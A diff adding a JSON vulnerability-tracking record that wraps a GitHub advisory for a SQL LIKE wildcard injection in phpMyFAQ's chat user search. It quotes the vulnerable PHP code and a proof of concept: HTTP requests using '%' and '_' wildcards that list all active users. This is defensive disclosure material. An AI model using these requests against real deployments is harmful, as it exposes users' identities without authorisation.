@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/190519836?v=4\", \"events_url\": \"https://api.github.com/users/proochicken/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/proochicken/followers\", \"following_url\": \"https://api.github.com/users/proochicken/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/proochicken/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/proochicken\", \"id\": 190519836, \"login\": \"proochicken\", \"node_id\": \"U_kgDOC1saHA\", \"organizations_url\": \"https://api.github.com/users/proochicken/orgs\", \"received_events_url\": \"https://api.github.com/users/proochicken/received_events\", \"repos_url\": \"https://api.github.com/users/proochicken/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/proochicken/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/proochicken/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/proochicken\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-47132\", \"cvss\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-20\", \"name\": \"Improper Input Validation\"}, {\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}, {\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}], \"description\": \"### Summary\\n\\n  An authenticated SQL LIKE wildcard injection vulnerability in phpMyFAQ’s chat user search allows any logged-in user to bypass the intended display-name search  filter and enumerate active users. The endpoint escapes SQL string syntax but does not escape `%` and `_`, which remain active `LIKE` wildcards.\\n\\n  ### Details\\n\\n  The vulnerable endpoint is:\\n```\\n  GET /api/chat/users?q=...\\n```\\n  Source:\\n```php\\n  // phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/ChatController.php\\n  $query = trim($request->query->get('q', ''));\\n\\n  if (mb_strlen($query) < 2) {\\n      return $this->json([\\n          'success' => true,\\n          'users' => [],\\n      ], Response::HTTP_OK);\\n  }\\n\\n  $chat = new Chat($this->configuration);\\n  $users = $chat->searchUsers($query, $this->currentUser->getUserId());\\n```\\n  Sink:\\n```php\\n  // phpmyfaq/src/phpMyFAQ/Chat.php\\n  $escapedTerm = $this->configuration->getDb()->escape(mb_strtolower($searchTerm));\\n\\n  $query = sprintf(\\n      \\\"SELECT u.user_id, ud.display_name\\n       FROM %sfaquser u\\n       LEFT JOIN %sfaquserdata ud ON u.user_id = ud.user_id\\n       WHERE u.user_id != %d\\n         AND u.user_id > 0\\n         AND LOWER(ud.display_name) LIKE '%%%s%%'\\n         AND u.account_status = 'active'\\n       LIMIT %d\\\",\\n      Database::getTablePrefix(),\\n      Database::getTablePrefix(),\\n      $excludeUserId,\\n      $escapedTerm,\\n      $limit,\\n  );\\n```\\n  `escape()` prevents SQL string breakout, but it does not escape SQL `LIKE` metacharacters. Therefore, attacker-controlled `%` and `_` are interpreted by the database as wildcards.\\n\\n  The project already uses a safer pattern elsewhere with ESCAPE '|' and wildcard escaping, but this chat search path does not apply it.\\n\\n  ### PoC: \\n\\n  Tested against:\\n\\n  phpMyFAQ 4.2.0-alpha\\n  commit c0b7158df4bfb11d57b1ef7d471760583c9c2fae\\n\\n  Prerequisite: attacker has any valid authenticated user account.\\n\\n  1. Ensure there are multiple active users in the database, for example:\\n```\\n  userId=2 displayName=\\\"Alice Finance\\\"\\n  userId=3 displayName=\\\"Bob Support\\\"\\n  userId=4 displayName=\\\"Carol Engineering\\\"\\n```\\n  2. Send a normal query that should not match any user:\\n```\\n  GET /api/chat/users?q=zz HTTP/1.1\\n  Host: target\\n  Cookie: [authenticated session]\\n```\\n  Observed response:\\n```\\n  {\\n    \\\"success\\\": true,\\n    \\\"users\\\": []\\n  }\\n```\\n  3. Send a wildcard query:\\n```\\n  GET /api/chat/users?q=%25%25 HTTP/1.1\\n  Host: target\\n  Cookie: [authenticated session]\\n```\\n  Observed response:\\n```\\n  {\\n    \\\"success\\\": true,\\n    \\\"users\\\": [\\n      {\\n        \\\"userId\\\": 2,\\n        \\\"displayName\\\": \\\"Alice Finance\\\"\\n      },\\n      {\\n        \\\"userId\\\": 3,\\n        \\\"displayName\\\": \\\"Bob Support\\\"\\n      },\\n      {\\n        \\\"userId\\\": 4,\\n        \\\"displayName\\\": \\\"Carol Engineering\\\"\\n      }\\n    ]\\n  }\\n```\\n  The same issue is reproducible with `_` wildcards:\\n```\\n  GET /api/chat/users?q=__ HTTP/1.1\\n  Host: target\\n  Cookie: [authenticated session]\\n```\\n  Local confirmation was also performed by calling the vulnerable phpMyFAQ\\\\Chat::searchUsers() method directly with seeded users. q=zz returned no users, while `q=%%` and `q=__` returned active users.\\n\\n  ### Impact\\n\\n  This is a SQL LIKE wildcard injection / search filter bypass vulnerability. Any authenticated user can enumerate active user IDs and display names through the  chat user search endpoint. This may disclose internal user identities, staff names, department names, or other sensitive account information depending on deployment.\\n\\n### Video PoC:\\n\\nhttps://github.com/user-attachments/assets/b684893f-ccb1-42af-9568-50900793076f\", \"ghsa_id\": \"GHSA-6pvm-2vjj-rx4w\", \"github_reviewed_at\": \"2026-08-12T15:17:54Z\", \"html_url\": \"https://github.com/advisories/GHSA-6pvm-2vjj-rx4w\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6pvm-2vjj-rx4w\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-47132\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-12T15:17:54Z\", \"references\": [\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-6pvm-2vjj-rx4w\", \"https://github.com/thorsten/phpMyFAQ/commit/bd4b08b012234ccfcff07bfe6518062475b29e0a\", \"https://github.com/advisories/GHSA-6pvm-2vjj-rx4w\"], \"repository_advisory_url\": \"https://api.github.com/repos/thorsten/phpMyFAQ/security-advisories/GHSA-6pvm-2vjj-rx4w\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/thorsten/phpMyFAQ\", \"summary\": \"phpMyFAQ: SQL LIKE Wildcard Injection in Chat User Search Allows Authenticated User Enumeration\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-12T15:17:55Z\", \"url\": \"https://api.github.com/advisories/GHSA-6pvm-2vjj-rx4w\", \"vulnerabilities\": [{\"first_patched_version\": \"4.2.0-alpha\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"thorsten/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.2.0-alpha\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6pvm-2vjj-rx4w",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "thorsten/phpmyfaq: < 4.2.0-alpha"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-47132"
+    ],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "thorsten/phpmyfaq"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-12T19:29:35.148651Z",
+  "provenance": {
+    "content_sha256": "8407d0bd0a1aaac0ba01967ec6c7549fd5ee21ee6c5755561d6d641376dcad78",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-12T15:17:54Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6pvm-2vjj-rx4w",
+  "status": "active",
+  "title": "phpMyFAQ: SQL LIKE Wildcard Injection in Chat User Search Allows Authenticated User Enumeration",
+  "updated_at": "2026-08-12T15:17:55Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6pvm-2vjj-rx4w"
+}
